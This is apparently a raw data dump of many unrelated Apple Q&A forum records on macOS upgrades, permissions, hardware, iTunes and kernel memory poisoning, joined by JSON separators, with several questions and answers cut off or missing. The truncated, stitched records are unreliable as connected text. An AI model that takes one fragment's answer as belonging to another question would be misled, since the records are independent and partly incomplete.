I'm trying to update a 10 year old iMac currently running OS 10.10.5. The hardware appears to be in great shape.\nWhen I go to Software Updates, it say no updates available.\nWhen I manually download 10.11 or 10.12, the installer PKG will launch, go through some prompts, then say it's installed a few megabytes (MB) and stop without asking for a reboot. After a manual reboot, it's still running 10.10.5\nWhen I go to App Store and try to install 10.13, it says there's a problem with the installer file.\n\nA: The .pkg installers don't directly upgrade the OS, they produce installer applications, and those can update the OS. As the support article with the download links says:\n\nOpen the disk image, then open the .pkg installer inside the disk image. It installs an app named Install [Version Name]. Open that app from your Applications folder to begin installing the operating system.\"\n\nAlso, your Mac may be too old to upgrade. You can look your Mac model up with the Mactracker app or on EveryMac.com. Or just run the installer app will tell you if it's too old.\n\nA: MacOS installers are date stamped such that even if the hardware is compatible with the version you are trying to install, the installer maybe deemed “expired” and not work. To get around this you need to set your system clock to a date when the installer would still be considered good.

It says:\n\nFor Mac computers with Apple silicon: You can connect a single external display to your Mac. Docks don’t increase the number of displays you can connect. On a Mac mini with an Apple M1 chip, you can connect a second display to the HDMI port. See the Apple Support article Mac computers with Apple silicon.\n\nThere are solutions involving DisplayLink, which is running a monitor over USB, with the attendant performance degradation.\n", "Q: What is the difference between erase and restore on Disk Utilily Mac? Got a bit of vocabulary confusion. I want to re-format an external hard drive. But I'm not sure what the difference is between restore or erase.\nDoes erase, removes all files. or not.\nI don't want to lose the files. But I'm in a position that can't allow me to back up the entire Volume, for lack of storage. SSDs are on the way, ETA 1 week.\nI found this answer online but can't be sure of its correctness.\nhttps://discussions.apple.com/thread/3111247?answerId=32268374022#32268374022\nWhat I generally do to re-activate a hard drive that could be stuck on a task. Is the following on terminal:\nps aux | grep fsck\nsudo kill -9 [task number]\nbut this solution does not format. or enable journaling. And, it limits the result by removing the drive's capability to re-write. Forcing me to apply:\nDisk Utility>First Aid (so far, sometimes it takes long, others very long).\nI feel like I'm asking many questions here.\nBut I simply wish to know if erase or restore will enable journaling without losing all your data\n(if Disk Utility can do this from their GUI would be a lifesaver).\nBut I'm willing to learn other solutions in the terminal as to how I found out:\nps aux | grep fsck \nThanks in advance\n\nA: Erase will delete all files. It erases the contents of the volume.\nRestore in Disk Utility is to copy the contents of one disk, or disk image, onto another. This will also erase the previous contents.\nHowever, it's not clear why you want to do this. What is the problem that you are trying to solve?\nThe Terminal commands that you provide do not 're-activate a hard drive that has got stuck on a task'. They kill a process that the CPU is running in memory. If you are trying to erase a disk and the process is becoming 'stuck', that might suggest a hardware problem on the disk itself.\nYou should never attempt any 'maintenance' or modification on a disk without a backup, as something could go wrong.\n", "Q: Screen randomly shuts off on an old iMac 27in I am posting a self-answered question to help anyone for an issue I spent several days looking for a solution for, and finally found one.\nI had an old non-supported iMac 27in that had the screen shutting off for no apparent reason after some time ranging from a 30 minutes to a few hours to sometimes days. I tried for months to find a pattern, but with no success. My only solution was to reboot the device during this time.\nThe machine would still be running perfectly, just the screen would not come back no matter what.\nI followed all the Apple official and other non-official guides with no success.\nI finally found a consistent solution to revive the screen which I posted below. Hope it helps.\n\nA: The solution I found that would revive the screen was:\nCtrl + Shift + Eject\nSometimes I have to press them twice, but it would consistantly work to revive the screen.\nHope it helps!\n", "Q: macOS Big Sur (Command + Tab) does not show the Finder App anymore Pressing Command+Tab to switch between open applications works fine except it does not show me the default Finder App anymore.\nI tried to reboot the laptop but still same issue.

The ultimate goal is to use a mirrored video stream in Webex, Zoom, or Skype.\nI have seen solutions involving virtual cameras (e.g., OBS, Logitech Capture), which work, but this requires additional software and processes to run in parallel.\nI am looking for a solution that works on the OS, driver, or hardware level to flip the image.  The solution could be a specific webcam  having a driver that allows flipping the webcam or an option on MacOs that I have not found.\nUnfortunately, the Logitech cameras I have and their companion software (Camera Settings) only allow for adjustments of brightness, zoom, etc. but not for flipping the image.\nUpdate to provide additional clarification on the use case: The background is that my webcam points first at a mirror -- hence, I need to flip the video screen to \"undo the mirroring\".\nUnder Windows, the device driver (\"device properties\") for many Logitech webcams offers the \"orientation\" option, allowing to flip the image horizontally or vertically.  I am looking for a similar option under MacOS -- or for another webcam offering this option.\nAny suggestions, ideas, or experiences are very welcome!\n\nA: Zoom has an option in the app Preferences to mirror the video image at your end.\n\nIf you're looking to send a mirrored image, then that's probably extremely non-trivial.\n", "Q: Confused about iCloud and iCloud Drive System Preferences→AppleID, there's an App list that using iCloud on this Mac\n\nNote that Mail and Reminders app are on the list, I can understand the data of Reminders needs to be sync to other devices like iPad or iPhone, but what data does Email have to sync with? Cause Email can retrieve emails from email servers directly, it does not need to be sync, right?\n\nLet's continue, click the options... button of iCloud Drive, it shows up an App list too, Apps that store documents and data in iCloud, again, we can see Mail and Reminder in the list, but what's the difference of Mail and Reminder between this list and the list mentioned above? What's more, I can only check the Mail above but uncheck the Mail on this list, but it does not make any difference, I can't see any Mail's data on my iCloud Drive(neither on my Mac nor the web page side)\n\nIn my opinion, I think iCloud Drive is an App too(build-in App), which is similar to Dropbox, Apps like Calendars, Contacts, Reminders, Notes and so on are all sync data respectively, not through iCloud Drive, if I need to sync files through iCloud Drive, I just need to save files to iCloud Drive folder, that's all.\nMy System Version: macOS Big Sur 11.5.1\n\nA: Ticking the box for Mail means that you are using and accessing the iCloud email servers for Apple accounts.\nBy default, the iCloud email servers use IMAP, which does sync its contents with one or more email clients, allowing you to have the same emails on multiple devices.\nThe second option is, as the dialog suggests, to allow Mail to store documents within iCloud file storage.\n", "Q: How do I remove the \"Do you want to replace it?\" dialog in Big Sur? On a new M1 with Big Sur I attempted to save over a file with Photoshop. Adobe has always presented a dialog box to confirm I wanted to save over a previous file. Note the \"confirm\" button is focused so I can quickly press return and be on my way.\n\nBut, on Big Sur a new system dialog has arrived that, again, asks me to confirm I wish to overwrite a file. Unlike the Adobe dialog this one does not default to confirm so I need to actually move the mouse to click on the button for this one (in addition to the old one). As a web developer I save over files hundreds of times a day so this has quickly started to annoy.\n\nMy question is how to turn this system dialog off. I can understand being presented with the question once, but the Adobe one makes the workflow so much easier.\n\nA: There is no facility in the OS to remove or disable the dialog.\nApple's dialogs have always had the safer option as the default, to avoid accidental 'click-through'. As said in the Comments, Command R will trigger the Replace command, which should be quick and easy.\n", "Q: Can't Edit Keyboard Settings in System Preferences At All - Unresponsive to Clicks When I navigate to System Preferences ▶ Keyboard to change shortcuts, etc., none of the buttons are responsive. I can't seem to change anything in the keyboard settings. They're not grayed out or anything; they just don't do anything when I click them. However, when I navigate to other System Preference settings, I can change them e.g. Display settings. Does anybody know what might be going on here and how to fix it?\nNote: I have a Macbook Pro 2019 with the most up-to-date OS software. I also have an Anne Pro 2 wireless keyboard connected via Bluetooth.

I'm on Big Sur, and I understand there have been some changes with permissions in macOS since Catalina. I don't understand, however, how it is possible that I cannot ls ~/Desktop when ls -l ~ shows drwx------+ for permissions and me as the owner. Could someone explain this?\nEdit: to be clear, I am not asking how to access this directory, but how it is possible that I cannot, given how Unix permissions work.\n\nA: [This answer is about how it is possible to get a permissions error accessing a file, when the file permissions allow access.]\nRecent versions of macOS have additional security layers that are independent of the normal unix-style access permissions. They (mostly) regulate access based on the identity of the program, rather than the user ID the program is running as. The new layers are System Integrity Protection (SIP), which regulates access to the core of the operating system, and Transparency, Consent and Control (TCC), which regulates access to \"personal\" information (as well as things like the camera and microphone).\nAccess can be vetoed by either these layers or the standard unix layers. That is, if SIP and TCC allow something but the standard unix permissions forbid it, it's forbidden. And if the standard unix permissions allow something, but SIP or TCC forbids it (as in your example), it's also forbidden.\nThese new security layers are necessary because we can't trust our software. Even if you set aside malware, experience is showing that many \"legitimate\" developers would love to spy on their customers for valuable personal data that we'd really rather they not have. So just because I'm running some program doesn't mean that program should have access to everything I have access to (e.g. my emails and contacts, location, camera, etc...).\n\nA: Allowing Full Disk Access to Terminal and iTerm is the key answer here:\n\n*\n\n*Open System Preferences > Security & Privacy > Privacy > Full Disk Access\n\n*Select the checkbox next to Terminal and iTerm\n\n\nA: Testing on a clean install of macOS Big Sur, in Terminal when I executed ls ~/Desktop I was presented with this dialog box:\n\nI clicked: OK\nI then executed ls ~/Downloads and was presented with this dialog box:\n\nI clicked: Don't Allow\nExecuting ls ~Downloads in Terminal again, it returned: ls: Downloads: operation not permitted\nI then went to System Preferences > Security & Privacy > Privacy > Files and Folders and had the following:\n\nAs you can see what I said OK to is checked and what I said Don't Allow is unchecked.\nSo, check to see that System Preferences > Security & Privacy > Privacy > Files and Folders > Terminal > Desktop is checked.\n\nNotes:\nIf you do not want to be prompted each time on protected folders, then add Terminal to: System Preferences > Security & Privacy > Privacy > Full Disk Access\nIn doing so, Files and Folders will show Terminal as having Full Disk Access instead of what's shown in the screenshot above.\nIf your uncheck Terminal in Full Disk Access, then whatever applications previously were under Files and Folders > Terminal will reappear with the same settings as last set.\n", "Q: Hotkeys for Word 365 for changing font colors?

What gen iPhone should I be buying to get the Watch 4/SE set up?\n\nA: You need at least an iPhone 6s for watch SE or an iPhone 6 for the watch 4.

Unfortunately this does not work in Firefox.\nHow can I get this to work?\nI am on macOS Big Sur 11.3.1, and Firefox is the latest version.\n\nA: It is a known issue: https://bugzilla.mozilla.org/show_bug.cgi?id=1563862\nHowever the issue is closed, and based on the comments it looks like it is related to the language of the browser.\nAs far as I can see the Firefox can be downloaded in different languages, but also language of the UI can be changed after. Also, it looks like if you are changing the language compared to the default the Emoji shortcut stops working.\nSo your best bet is to download Firefox in the language you are using it, instead of changing the language afterwards. Or you can always try to go to Preferences and change the language to the one Firefox was downloaded in originally. It may also matter to have the language of the System and Firefox set to the same.\nIn my case if I set Firefox to Italian the shortcut stops working, but if I set it to UK English, it starts to work (after restart). I assume it is because I've originally downloaded Firefox in English.\nIf you don't want to do that another workaround I've found is to go to System Preferences… > Keyboard and on the Keyboard tab turn on the \"Show keyboard and emoji viewers in menu bar\". With this there will be a flag icon in the upper right of the screen, where the Emoji viewer can be opened, just like as if it were opened using the ⌃+⌘+space shortcut.

All USB devices have circuitry inside of them to turn the USB power into the correct voltage for their batteries, meaning it is perfectly fine to use your iPhone's power adapter with them.\nThe USB cable on the other hand, assuming it is the same one used to charge your iPhone, is a Lightning to USB cable, where Lighting is the proprietary connecter used on Apple's devices.

(Similar to this question, but for iOS Safari instead of macOS Safari)\nA site I used to frequently visit keeps appearing as the Top Hit in mobile Safari's autocomplete bar. I would like to remove the URL, as I no longer visit the site and don't wish to be reminded of it.\nHow do I remove a URL so mobile Safari stops autocompleting it?\n\nA: Remove it from your history.\nSearch for it in Safari history and then delete them one at a time. Unfortunately clicking \"clear\", even while looking at search results, clears all history instead of just the search results. There's no way to delete many history entries at the same time.\nYou can delete an entry at a time from history by swiping leftwards on it, exposing a Delete button on the right of the entry.\nOr holding down on the item in history until it previews and a \"Delete\" button is shown in the context menu.\nIf you're doing some kind of iCloud sync with your Mac's browser, you will also need to follow the instructions in the question you linked for macOS.\n", "Q: Applescript replace characters without adding new line We have a subtitle team working for several streaming platforms and some of them use old systems that will not accept a few characters like …, “, ”, etc. So I built a script for replacing those characters and inform some that might need further attention.

I cannot use browser/apps it says \"SSL ERROR BAD CERT DOMAIN\" or \"your connection is not protected...\".\nWhat can I do to fix this?\n\nA: Regardless of the questionable circumstances of your question, most of the time, under a 'more details' or 'advanced' button is the option visit the site anyway, or chrome you can start like this. Though, it's worth noting that this connection will be unsecured and will put you at risk as the data can be easily read if intercepted.\nSo, if you do decide to use this method, I'd highly discourage entering any sensitive information at all, such as credit cards, passwords, etc. Even just visiting a website that you're logged in to can put you at risk as your browser would have to send a token from a cookie, stored on your computer, to the website in place of your password, which could lead to the token being compromised.\nUltimately, if I were in your position, I wouldn't take the risk and either  use a free alternative (see the comments on your question for recommendations), pay for Parallels, use an old windows laptop, or get your work to provide you another way that doesn't require you to ignore security warnings like this.\n", "Q: Activate Numbers app and populate chart every 30 minutes I'm editing this again to show the latest revision.

I am assisting a friend who has lost a phone and is considering getting an older phone (iPhone 7) as replacement, as it is well regarded in the digital photography profession.\nThe concern is that the router at their place, latest Comcast product, may produce issues with a legacy phone, such as the iPhone 7.\nAre there any known issues with a latest model Comcast router and older Apple iPhones? How old of a phone model could they go? iPhone 6 or 5, perhaps?\nThey are concerned that the router may combine both 2.4 GHz and 5 GHz signals that the phone may have difficult connecting because it can't distinguish between both signal types.\n\nA: I wouldn't yet consider the iPhone 7 to be a 'legacy smart phone', especially seen as Apple is still continuing to push software updates for it.\nIn terms of capability, the iPhone 7, like most devices released before February of last year, uses Wi-Fi 5. The most recent revision is Wi-Fi 6 which is backwards compatible with Wi-Fi 5, so everything should just work!\nThe only issue that could occur is that, very rarely, if someone purposefully change the settings of the router, it may be misconfigured to only allow connections over Wi-Fi 6. To fix this you'll have to go into the router's settings and change it back.\n\nA: I have iPhones 6, SE running on both 2,4 GHz and 5 GHz modern router.\nI had problems with the last iOS updates. Apple for privacy protection choosed to switch to dynamically attributed MAC ( Medium Access Control ) address.\nThey recently added a function to inactivate this function and everything\nis again working fine on all our iPhones on a modern Wi-Fi router: an iMac running all 802.11*, a DHCP server, and a high grade firewall, within a crowded Wi-Fi environnement ( more than 40 neighbors networks ).\nAn iPhone 7 won't have any problem with a router up to the latest 802.11* protocols specification on whichever channel ( 2.4 GHz and 5 GHz ).\n( Personnal waranty from my 30 years experience on network and security architecture. )\n", "Q: Is 5.45GB normal for Project Build and Index in Xcode? Today I ran a Xcode project on a react-native project, and it add up to 5.43 GB for only one simple project, is that normal? So if I have 10 projects it will add up to 50 GB??!!?\n\nIn Android, it eats up 12 GB for the SDK but it does not consume anymore space, but Xcode eats up 5 gigs a project... Is that normal? I tried to create new project and it added up to 9 GB.\nI deleted this project and it added up again. Is there any solution for this?\nI ran on Xcode 12, MacOS 11.5.1, MacBook Pro M1.\n\nA: The \"Project Build Data and Indexes\" entry you see there is combined for all your projects. As you create new projects, I wouldn't expect each of them to increase the amount of disk space used by the same amount as the first - i.e. various caches, pre-built data and indices are only needed once (or once per architecture, once per device model, once per iOS version or similar).\nWhether or not 5 GB of data for a single Xcode project is \"normal\" is impossible to say. Some projects take up 50 kB of disk space, some takes up 50 GB - it really depends on the specific project.\n", "Q: Big Sur causes failure to launch of Automator scripts An Automator task runs an rclone script for backups.

I researched and some sources said that I should just scan the QR-Code with my Camera app but that just opens a long string of numbers in my standard browser.\nIs this a bug or am I missing a feature?\n\nA: The company that runs the ticketing system for the ticket you purchased is responsible for providing a way to add a pass to wallet, usually through their app or a valid Apple Wallet link (hence how it could be embedded in a QR code). For example, an airline would have a 'Add to Apple Wallet' button in their app, or email you an 'add to wallet' link.\nI'd recommend looking into whether the service you bough the ticket through has an app with wallet capabilities listed towards the bottom of the App Store product page. Otherwise they may not support Apple Wallet and then you'd be out of luck.\n", "Q: Is it possible to enable going to the bottom of the context menu from top with pressing up key?

How can I activate that circular behavior?\nI did some search but couldn't find anything.\n\n\n\nA: In order to jump from the top item on the context menu to the bottom item on the context menu, and from the bottom item on the context menu to the top item on the context menu, you need to use the ⌘ key in conjunction with the down-arrow and up-arrow respectively.\nPress ⌘ Up-Arrow to highlight the top item on the context menu, releasing the keys, then press  ⌘ Down-Arrow to highlight the bottom item on the context menu.\n\n\nA: Found a perfect solution. I realized that when you type a letter, selection directly jumps into the item that starts with that letter. You can type words and it goes to first match. That's really useful.\nSometimes I don't get why Apple lacks some features but then I realize I don't actually need them.\nI won't change the selected answer as it exactly explains what I've asked. But I'm also sharing this as it helped me to solve the issue I was having.\n", "Q: How can I remove Wacom Driver I noticed WacomTabletDriver in my Activity Monitor.\nI have a Wacom Tablet, which I used on a 2011 MacBookPro, but it is no longer supported.\nI found instructions to remove on Wacom's website, but I don't have any of the apps suggested.\nThis is presumably a hangover from when I migrated to an iMac a couple of years ago.\nHow can I remove it?\n\nA: I'd be inclined to start digging manually. If your driver setup is old & unsupported, it might also have 32-bit components you can't even run to allow them to self-uninstall. You can't install a new version for an unsupported tablet which would allow you to uninstall using the same app...\nGet hold of EasyFind (freeware), set the search criteria in the left column to Files & Folders, Name, Phrase, Ignore Case & Invisible. Set the Location to your boot volume & the search term to wacom. Hit Go.\nUse a bit of 'skill & judgement' to determine which really belongs to Wacom & which is provided by other apps in support of it…\n\nFor instance above, the entries for Studio Artist belong to that app not to the generic Wacom support. Items in frameworks may not allow simple removal, so trash what you can & either come back for those or if SIP stops you… ignore them. They won't ever get called if nothing needs them & they're so tiny they take up negligible space.\nReboot afterwards.\nMake sure your backup is up to date before you start, but I doubt anything else in that list would hurt to remove.\n\nA: After some further searching I came across a link suggesting removing files and folders that start “com.wacom” in the following:-\n~/Library/Caches\n\n~/Library/Container\n\n~/Library/Preferences\n\nThis appeared to work, and in the process I removed a lot of dead references to 32 bit Microsoft Office files.\n", "Q: Change path of file before running a command in automator I created a service in automator to open a file via quicklook, using the below code\nqlmanage -p \"$@\"\n\nI'm able to open the selected file via quicklook. But I want to open a different file located in another directory whilst selecting a file with same name.\n\nFrom the screenshot you'll see that the path of the selected file is /Users/kingamada/kut.stl\nI want to change the path before the qlmanage -p \"$@\" command, so that even when selecting kut.stl in different folder, it's kut.stl in the specified directory that will be passed to qlmanage -p \"$@\".\n\nA: The path provided to “run shell script” is literally just the text of the path. This means that you can modify it using your scripting language’s standard text munging tools.\nI would probably do this in one of two ways:\n\n*\n\n*Just modify the file path in the same step as running quicklook. This has the advantage of keeping everything right next to each other in a single easily-visible step.\n\n*Or, modify the file path in a separate “run shell script” step. This has the advantage of keeping each step separate, which itself has the advantage of allowing different tools for each step.\n\nIn bash, you can get the file name from a file path using $(basename $variable).

The default touch has man pages written in 1995.\nHere is an example of what happens:\n$ ls -l\ntotal 8\n-rw-r--r--  1 xxx  staff  9 Aug 14 10:10 testfile\nlrwxr-xr-x  1 xxx  staff  8 Aug 14 10:11 testfilelink@ -> testfile\n$ touch -h testfilelink\n$ ls -l\ntotal 8\n-rw-r--r--  1 xxx  staff  9 Aug 14 10:15 testfile\nlrwxr-xr-x  1 xxx  staff  8 Aug 14 10:11 testfilelink@ -> testfile\n$ \n\n\nA: It seems you have found a bug in macOS. The next-to-last major version of the operating system works according to the manual paage, but the latest version does not.\nEither the manual page is outdated, or the software has a bug (most likely).\nYou can send feedback to Apple as a general user here:'\nhttps://www.apple.com/feedback/macos.html\nOr if you are a developer, you can use the Feedback Assistant to file a bug report as described here:\nhttps://developer.apple.com/bug-reporting/\nThere's currently no newer version of touch available from Apple so you cannot as such upgrade your way out of the problem. As you indicate yourself, you can instead use the GNU version of touch to get the job done. You can find that in Homebrew by installing coreutils.\nThe GNU version of touch works by calling the newer futimens()/utimensat() functions (in the latter case with the flag argument set to AT_SYMLINK_NOFOLLOW to change the timestamp for the link itself).\nThe Catalina version of touch (287.100.2) works by calling the older lutimes() function, which explicitly sets the timestamp on the link itself. One of the core differences between the newer and older APIs are that the newer supports timestamps in nanoseconds, whereas the older has a lower resolution.\nThe lutimes() function on Big Sur actually doesn't implement a system call itself, but is actually contained fully in the standards library, using the setattrlist() function (which results in a system call) to actually perform the file system modification. setattrlist() is highly file system dependent (i.e. how it works on HFS+ file systems would be different from how it works on APFS file systems).\nThe Big Sur version of touch (321.100.11) works by calling the setattrlist() function directly, and only if that fails, fall back to lutimes. Unfortunately, it seems the programmer forgot about the need to specify that when -h is specified, the modification must take place on the link itself.\nThe actual bug is in line 219 of touch.c, where this line:\nif (!setattrlist(*argv, &ts_req, &ts_struct, sizeof(ts_struct), 0))\n\nshould have been:\nif (!setattrlist(*argv, &ts_req, &ts_struct, sizeof(ts_struct), utimes_f == lutimes ? FSOPT_NOFOLLOW : 0))\n\nYou could change that in touch.c, recompile it, and get a working binary.\n", "Q: Keynote master slide I have keynote 11 on iPad 6th.

This approach gives the user full control over the pointer, physically and cognitively. Were it to move unpredictably and unrelated to the movement made by the user, it would result in confusion and cognitive dissonance, such as:\n\n*\n\n*where did the pointer go? I was just looking at it and it disappeared\n\n*I was about to click on something over here, but when I did so a button on a different part of the screen got clicked\nThis is so fundamental in fact, that I can't find a specific reference to it in Apple's documentation. Maybe it is not explicitly discussed since Apple set the standard through its API and it is accepted as a given now after nearly 40 years. The most relevant references I can find are ones like these from Inside Macintosh (1985):\n\n…the user's actions tend to have direct results … The user, not the system, decides what to do next … they would be confused and irritated if they had to learn a completely new interface for each application …\nIn general, moving the mouse changes nothing except the location, and\npossibly the shape, of the pointer.\n\nSo, left implied by Apple's human interface guidelines — and enforced by the API — is that the pointer should only be moved when the user interacts intentionally with the mouse/trackpad/pointing device.\nNow, this begs the question, why do you want this behavior?\n\n*\n\n*If you are a programmer, I would strongly urge avoiding doing this in your applications for the reasons above.\n\n*If you want it for yourself, what is your goal, that you can more easily target the default button in dialog boxes? If so, I would call your attention to the fact that the primary (default) button is given the system's highlight color (by default a blue background) and will respond to a press of the Return key. Note the examples in Apple's current Human Interface Guidelines at Dialogs. (Also note that if you have System Preferences ▶ Keyboard ▶ Shortcuts ▶ Use keyboard navigation… turned on, you can use Tab / Shift+Tab to change what button is selected and Space to activate it.)\n\nSo perhaps you can come to appreciate the predictability of the Mac pointer not jumping around — especially since as a longtime Windows user, it should be comforting to know keyboard shortcuts can be your fastest approach to confirming dialogs. \n\nA: SteerMouse has this function beside others.\nhttps://plentycom.jp/en/steermouse/download.php\n\n", "Q: Disable Smart Copy/Paste globally If I copy a word and paste it at the beginning of a filename in Finder, a space it automatically added with it. For example, if I copy the word fruit and attempt to paste it at the beginning of a filename basket, I would get fruit basket instead of fruitbasket (notice the automatically-added space).\nI can disable this feature in Safari and TextEdit, but the setting appears to be missing in Finder. Furthermore, as I never use this feature, I would much prefer for it to be disabled globally. Can this be done?\n\nA: I think you have confused copying a word and copying the letters of a word.\nCopying a word (double click on a word, then command-C) does include a trailing space which is included when you paste in a filename.  In some apps copying a word this way also includes a leading space.\nBut copying the letters of a word (click and drag over the word, then command-C) does not include the trailing space. A paste in a filename then behaves as you want.\nI realise this does not explicitly answer your question, but I hope it clarifies copying words.\n", "Q: Change UI's menu select blink rate Back in System 7 there was an option to change how many times a menu item would blink when selected:\n\nIs it still possible to change this setting in modern-day macOS versions?

It can be written to accommodate command line arguments, such as the URL and filenames, etc.\nNotes:\nThe order in [.id, .symbol, .name] was used just because that's the way it is in the raw data at the website and also how it's retrieved using curl, while JSON Helper changed the order to id, name, symbol.  You can change the order in the printf statement and the jq query as you'd like.\nIf you don't have or use Homebrew, you do not need it in order the get jq as a precompiled binary is available.

I have installed the latest iTunes on my Windows 10 machine and the iPad is not recognized, the restoration process cannot be initiated.\n\nA: I put a series of best practices to restore the iPad Air below after the long paragraph description.\nDescription:\nI spent about 4 hours figuring out the steps below to get my iPad Air restored shortly after purchase. I did not have the password set during the original install, so the iPad Air got in a locked state. I have a MacBook Pro that does not run the latest OSX. I cannot connect and restore my iPad Air. I decided to do the restoration with a Dell laptop running Windows 10 Home edition (Version: 2004, OS build: 19041.985, Experience: Windows Feature Experience Pack 120.2212.2020.0)\nFirst of all, there is a major problem with the iTunes installer on Windows.\nI have noticed the latest versions of iTunes (12.10.11) do NOT install the Mobile Device Support Driver files. The only way to have them installed is by installing an older version of iTunes(see below why). So basically if you have a new Windows computer with the latest iTunes 12.10.11 from Dec 7.2020 you do not get the driver files. It means that when you put the iPad in restoration mode, Windows does not detect it when you connect it to the computer over USB-C.\nThere is very little online about this issue and how to solve it properly. Most of the support ask to re-install iTunes, unfortunately, you have to remember that NOT ALL versions of iTunes are equal (this comment is directed to the support teams at Apple and Microsoft!).\nI found one website that would provide the driver files by themselves so they can be dropped in the file system. I thought I would look for the actual version of iTunes that would install the driver files.\nI tested iTunes 12.10.11 64bit version from Dec 7, 2020, as explained, followed by iTunes from Mar 25, 2019. Finally, the iTunes 12.4.3 64bit from Aug 1, 2016, is the release that installs the driver files. From that install, it is possible to upgrade to the latest iTunes, so you would install the latest version for August 15, 2021, which is version 12.10.11. It installs well over the 2016 version without compromising the driver files.\nNow at that point, I thought I was good to go with the proper driver files installed on my Windows machine. I put the iPad (Air) into recovery mode and got it connected to the Windows machine. I heard the usual Windows sounds when devices are connected (USB), I also almost right away heard the Windows sound for disconnection. Looking at iTunes it would not show the iPad at all. The Windows Device Manager would not list the iPad Air under Universal Serial Bus controllers!\nSo my last move was to connect another Apple device to see if the issue was related to the iPad Air or iTunes. I connected my iPhone, UNLOCKED the screen and the phone showed up in iTunes. Next, I put the iPad Air in restore mode and connected to the computer, to my surprise, iTunes recognized the iPad Air this time with the option to restore it. From that point, I initiated a first restoration which failed with an error message, followed by a second restoration that succeeded.\nList of lessons learned and best practices to restore the iPad (Air):\n(Windows 10 user only)\n\n*\n\n*If you don't have the iTunes version from August 1st, 2016, installed on your computer, remove iTunes and re-install the iTunes 12.4.3 from 2016. It will guarantee you have the proper files under C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\n\n\n*Update the iTunes to the latest version, 12.10.11 (latest for this post on August 15th 2021).\n\n\n*If your iPad Air is in a locked state, and you don't have a password, connect to another Apple device and unlock the screen. What it will do is help iTunes to recognize the iPad Air later on. That's a weird step, but it works.\n\n\n*Initiate the restoration of the Apple iPad Air (twice if needed) via iTunes.\nNone of this is trivial and, by neglecting the iTunes installer deliverable, Apple generated a tremendous amount of support for both Microsoft and Apple on a procedure that should be trivial. The outcome of the support does not help in the condition that I faced. No posts at Microsoft or Apple addressed my needs. I do believe I am not the only one struggling with this issue and, pretty much every single user running Windows 10 with a recent computer would face the same problem(scary!). We do not expect to do a restoration every day. At the minimum, we should have the Windows installer doing the proper thing.\n", "Q: How to avoid audio clipping when using SAY command in AppleScript?

I've been looking for a mouse for a late 2015 iMac for roughly 4 hours now because my mother told me that only some mice work and others will damage and possibly break the computer.\nI've been looking all over the internet like a madman and eventually decided to reach out to an Apple Administrator about my issue and she sent me a link to the certified hardware built for the iMac.\nThe only mouse that was certified was the only mouse I wasn't looking for (Magic Mouse), so by that logic there is no mouse built for the iMac that isn't the one that doesn't have any scroll wheel or left and right clicks.\nI was wondering if any old mouse might destroy the computer like my mother said since she could have gotten that info from anywhere.\n\nA: First, any mouse that connects via Bluetooth cannot do physical damage to your computer.\nSecond, any mouse connected through a USB hub, even if it managed to damage the USB port in the hub, it would have trouble damaging your computer.\nThird, any competently built mouse by a reputable vendor should be harmless. If anything, this is an admonishment not to buy no-name cheap Cheese junk.\n\nA: People have been plugging any old USB mouse into their Macs for the last 20 years, without incident.\n\nA: Mice are mice.  Any USB mouse will be fine.  If that mouse has more than two buttons and a scrollwheel, you may need software to use all of its features, so look for a manufacturer that provides support for the Mac.\n\nA: While it is certainly possible to hook up hardware that can damage a computer, that's nothing specific to Macs, it's specific to that hardware.\nAnd usually that's because you're hooking up something that's broken bad and causes overvoltage on the USB socket for example. A mouse, being a device without an external power source, isn't going to do that.\nI've been using 3rd party rodents and keyboards with all my Macs for years and years, never had a problem apart from the occasional wonky driver that caused buttons to be mapped in strange ways, and even that is very rare these days.\nThe only advantage of \"certified\" externals is that if something goes wrong using the combination, Apple is going to cover it under warranty. But with a mouse, nothing's going to go wrong unless you deliberately do something like yanking out the connecting cable at a very steep angle.\n\nA: Totally agree with Marc Wilson here. On my iMac I've been using a wired USB Microsoft Intellimouse 3 for years, and occasionally a cordless Logitech mouse as well. Sometimes I forget that both are connected and you can have input from both at the same time.\n", "Q: Messages.app is not synchronizing on my apple ID I am logged into the iCloud account and Messages.app was working on another macbook pro for me.

This is an older 2015 laptop on Big Sur.\n\nA: This may be only a partial answer but it does allow to set the name of the linked messages user.\nIt is necessary to configure the \"Apple ID\" configurator in System Preferences.\n\nIt is a complicated ordeal to configure it seems.  I am partially through that configuration.  Messages are still not synchronizing from iCloud.\nUpdate  Messages are now getting synchronized.

I am involved in both macOS and Linux.\nLinux automatically erases every freed memory in order to prevent leakage of information left in freed memory, and also to prevent attacks that seek or rely on information left in freed memory (e.g. uninitialized variable attacks, use-after-free attacks, reuse attacks, stack content exposures, and heap content exposures) (https://www.kernel.org/doc/html/v4.18/security/self-protection.html).  I like this feature of Linux, and I am wondering if macOS has this feature as well.\n\n*\n\n*Does macOS automatically erase every freed memory?\n\n\n*(Assuming #1 is positive) Since which version of MacOSX, OSX or macOS, has it been equipped with this feature of automatic erasure of freed memory?\nWhen you answer, try to point out an official Apple document (either at developer.apple.com or support.apple.com but NOT forum.apple.com) that supports your answer.\nBy the way, Linux Kernel Self-Protection includes \"memory poisoning\", which does more than \"memory erasure\".  \"Memory Poisoning\" fills the freed memory with a special signature in order to identify bad or corrupted memory data and warn the system when this bad data is eventually read (https://patents.google.com/patent/US20140006879A1/en).\n\nA: Your question is a bit vague and therefore hard to answer.\nContrary to what you write, Linux does not automatically erase every bit of freed memory on the system. To answer your question #1, macOS does not do this either.\nI think your misconception about Linux comes from the fact that Linux can clear freed kernel memory, if configured to do so. On normal systems that is only a small fraction of the total system memory.\nIf you look at user space applications on macOS, the developer can set it up so that memory is cleared or poisoned on free. For performance reasons, this is mostly done with parts of memory where secrets can be leaked (such as for example cryptographic keys).\nIf you're interesting purely in the kernel itself, then the macOS kernel also has features related to zeroing and poisoning freed memory. The kernel includes a zone allocator, where zones can be setup to be zeroed, poisoned (i.e. 0xdeadbeef written all over) or merely canaried (i.e. a canary - specific data bytes - is written to the start and end of the allocation - primarily to catch bugs).\nThe kernel by default enables instant poisoning for very small alloocations (up to the size of the CPU's cache line size - depends on the CPU, but could for example be 64 bytes). For larger allocations, freed memory is periodically poisoned with a frequency depending on the size of the allocation. Instant poisoning of very large allocations comes with a performance impact, so this reduces or at least spreads out that impact.\nYou can find the source code for the zone allocator here:\nhttps://github.com/apple/darwin-xnu/blob/main/osfmk/kern/zalloc.c\nLooking back at the version history, I can see that memory poisoning was included as an option back in 2009 - this would place it just before Mac OS X Snow Leopard.\nAs far as I know, memory poisoning was included in iOS 2 (at the time called iPhone 